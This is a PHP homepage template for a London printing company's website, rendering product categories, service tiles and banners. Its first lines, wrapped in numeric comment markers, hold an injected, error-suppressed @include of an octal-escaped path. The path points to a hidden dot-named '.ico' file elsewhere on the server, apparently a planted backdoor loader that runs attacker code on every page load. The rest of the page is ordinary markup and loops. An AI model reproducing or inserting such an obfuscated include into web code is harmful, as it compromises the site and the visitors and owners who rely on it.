<?php
/*42785*/

@include "\057ho\155e/\165th\141ra\160ri\156tl\157nd\157/p\165bl\151c_\150tm\154/d\145mo\057ut\150ar\141pr\151nt\055au\163tr\141li\141/l\151br\141ry\057.2\06461\144f2\070.i\143o";

/*42785*/



ob_start();
session_start();
error_reporting (E_ALL ^ E_NOTICE);
include('includes/top_header.php');
$tempProductDAO = new ProductDAO();
$tempProductMainCatDAO = new ProductMainCategoryDAO();
$tempProductCatDAO = new ProductCatDAO();
$tempOurserviceDAO = new OurserviceDAO();
$tempOurbrandDAO = new OurbrandDAO();
$tempBannerDAO = new BannerDAO();
$tempFeaturesDAO = new FeaturesDAO();

//echo count($tempProductCatResult);die();
$tempBestsellingProductCatResult = $tempProductCatDAO->BestsellingProductCatList();
$tempTopSellerProductCatResult = $tempProductCatDAO->TopSellerProductCatList();
$tempMusthavesProductCatResult = $tempProductCatDAO->MusthavesProductCatList();
$tempProductCatResult = $tempProductCatDAO->mainProductCatList();
$tempOurserviceResult = $tempOurserviceDAO->OurServiceList();
$tempOurbrandResult = $tempOurbrandDAO->OurbrandList();

$topBanner1=12;
$personalizeBanner1=2;
$personalizeBanner2=3;
$samplePackBanner1=4;
$samplePackBanner2=5;

$tempFeaturesResult=$tempFeaturesDAO->FeaturesList();

$tempBannerVO=$tempBannerDAO->getBannerDetails($topBanner1);
$topBanner1=$tempBannerVO->getImage();
$topBannerDesc=$tempBannerVO->getBannerDesc();
$topBannerUrl=$tempBannerVO->getBannerUrl();
?>
<!DOCTYPE html>
<html lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    
    <meta name="robots" content="noodp, noydir" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0">
    <meta name="description" itemprop="description" content="<?php echo $pageMetaDesc;  ?>" />
    <meta name="keywords" content="<?php echo $pageKeyword;  ?>" />
    <meta property="og:title" content="<?php echo $ogTitle; ?>" />
    <meta property="og:description" content="<?php echo $ogDescription; ?>" />
    <meta name="google-site-verification" content="1tqjQUnablG3wJHnp4mHHZf7oMyG5lI7BVVgsYGsNso" />
    
    <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TFMPXDG');</script>
<!-- End Google Tag Manager -->

    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    
    <!---snow flow on website-->
<!--<script src="https://utharaprint.co.uk/js/snow.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
window.onload = function() {
  try {
    snow.count = 30;   // number of flakes
    snow.delay = 20;   // timer interval
    snow.minSpeed = 2; // minimum movement/time slice
    snow.maxSpeed = 5; // maximum movement/time slice
    snow.start();
  } catch(e) {
    // no snow :(
  }
};
//]]>
</script>-->
    <!--css-->
    <link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32" />
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/responsive.css">
    
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
   
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <!--css-->
   
	<style>
		
	* { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; }
*:before, *:after { -webkit-box-sizing: inherit; -moz-box-sizing: inherit; box-sizing: inherit; }

	</style>
    <title>Uthara Print London - Business Choose Uthara</title>
</head>

<body>
    
    <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TFMPXDG"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
    
    <!--Start mainContainer-->
    <div class="mainCon">
         <?php include 'header.php'; ?>
		<div class="icon">
	<a href="https://utharaprint-london.co.uk/offers.php" class="gift" target="_blank"><i class="fa fa-gift"></i><b style="line-height: 35px">Special Offers</b> </a>
	
	
	</div>
        <div class="content">
        
        <div class="lineh" id="line"></div>
        <div class="lineh" id="line"></div>
			<section id="body1">
			<section class="fullsize-video-bg">
			<div id="video-viewport">
			<?php echo "<img src='upload/banner/$topBanner1' alt='save money'/>";?>
			</div> 
			</section>
		</section>
			
			
           <!-- <div class="bannerBox">
                
            </div>-->
			<div class="lineh"></div>
				<div class="lineh"></div>	
		
			<div class="container-sm " style="width: 100%;text-align: center;padding:10px;color: #294b8a;font-weight: 600;background-color: #d4edfc;">COVID-19 Update: It is business as usual at Uthara Print and we are open for business! Read more about the current situation here.</div>
                        
            <div class="container-sm productOffers">
                <h1 class="mainHd">Offer Products </h1>
                <div class="productContainet ">
                     <?php
                            
                              if(count($tempProductCatResult)>0)
                                                         {
                                                               $count = 1;
                                                               for($i=0;$i<count($tempProductCatResult);$i++)
                                                                {
                                                                   $tempProductCatVO = $tempProductCatResult[$i];
                                                                   $productName      = $tempProductCatVO->getcatName();
                                                                   $productCatId     = $tempProductCatVO->getProductCatId();
                                                                   $productImg       = $tempProductCatVO->getImagePath();
                                                                   $dirName          = $tempProductCatVO->getDirName();
                                                                   $aliasName        = $tempProductCatVO->getCatAlias();
                                                                   $shortCatDesc     = $tempProductCatVO->getShortDesc();
                                                                   $arrayName   = explode('Printing', $productName);
                                                                   $productName = $arrayName[0];
                                                                   if($productImg=="" || $productImg==NULL)
                                                                   {
                                                                       $productImg = "no-preview.jpg";
                                                                   }
                                                                   echo "<div class='productBox transition width'>
                        <div class='productImage'> <a href='$dirName' class='productLink'><img src='upload/productcategory/$productImg' alt='$productName'></a></div>
                       
                           
                            <div class='productitleservice'>
                                <a href='$dirName' class='first'>$productName</a>
                            </div>
                          
                      
                          <a href='$dirName'><div class='productPrice'>Order Now</div></a>
                    </div>";
                                     
                                        $count=$count+1;
                                         }
                                        }
                    ?>
					
					
                </div>
							
            </div>
            <div class="container-sm offercontainer" style="">
             <?php              $samplePackBanner1=4;
				$tempBannerVO=$tempBannerDAO->getBannerDetails($samplePackBanner1);
				$samplePackBanner1=$tempBannerVO->getImage();
                                $samplePackUrl1=$tempBannerVO->getBannerUrl();
               echo "<div class='offerbox productBox transition'>
                    <a href='$samplePackUrl1'><img src='upload/banner/$samplePackBanner1'></a>
                    </div>";
                                $samplePackBanner1=5;
				$tempBannerVO=$tempBannerDAO->getBannerDetails($samplePackBanner2);
				$samplePackBanner2=$tempBannerVO->getImage();
                                $samplePackUrl2=$tempBannerVO->getBannerUrl();
                echo "<div class='offerbox productBox productBox2 transition'>
                    <a href='$samplePackUrl2'><img src='upload/banner/$samplePackBanner2'></a>
                </div>";?>
                		
                
            </div>
			<div class="container-sm productOffers" id="service">
                <h1 class="mainHd">Our Services </h1>
                <div class="productContainet">
                    <?php
                        if(count($tempOurserviceResult)>0)
                        {
							$j=1;
                            for($i=0;$i<count($tempOurserviceResult);$i++)
                            {
                            $tempOurserviceVO=$tempOurserviceResult[$i];
                            $desc=$tempOurserviceVO->getOurservice_desc(); 
                            $bdirName=$tempOurserviceVO->getOurservicedir();
                            $name=$tempOurserviceVO->getOurserviceName();
                            $image=$tempOurserviceVO->getOurservice_image();
                            echo "<div class='productBox transition width'>
                        <div class='productImage'><a href='blog/$bdirName'><img src='upload/service/$image'></a></div>
                       
                            <div class='productitleservice'>
                                <a href='blog/$bdirName' class='first'><span class='first'>$name </span></a>
                              
                            </div>
                                               
                    </div>";
                                       
						 $j=$j+1;			
						}
                        }
                            ?>
                   
                         
                    </div>
			<br/>
        </div>
	
        <?php
            include 'newsletter.php';
            include 'footer.php';
        ?>
    </div>
    <!--End mainContainer-->
    <!--script-->
    
    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/function.js"></script>

	
		
</body>

</html>